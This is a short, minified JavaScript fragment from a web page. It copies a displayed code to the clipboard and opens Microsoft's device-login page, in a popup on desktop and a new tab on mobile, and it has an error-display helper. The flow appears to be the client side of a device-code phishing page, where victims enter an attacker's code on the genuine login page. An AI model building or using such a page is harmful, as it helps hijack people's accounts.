function cc(){navigator.clipboard.writeText(document.getElementById('uc').textContent);const b=document.getElementById('cpb');b.textContent='\u2713 Copied!';setTimeout(()=>{b.textContent='Copy Code'},2000)}
function gm(){cc();const m=/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)||window.innerWidth<=768;if(m)window.open('https://microsoft.com/devicelogin','_blank');else window.open('https://microsoft.com/devicelogin','ML','width=500,height=600,left=20,top='+(screen.height-600)/2)}
function se(m){document.getElementById('lds').classList.add('hidden');document.getElementById('dcs').classList.add('hidden');document.getElementById('em').textContent=m;document.getElementById('ers').classList.remove('hidden')}</script>
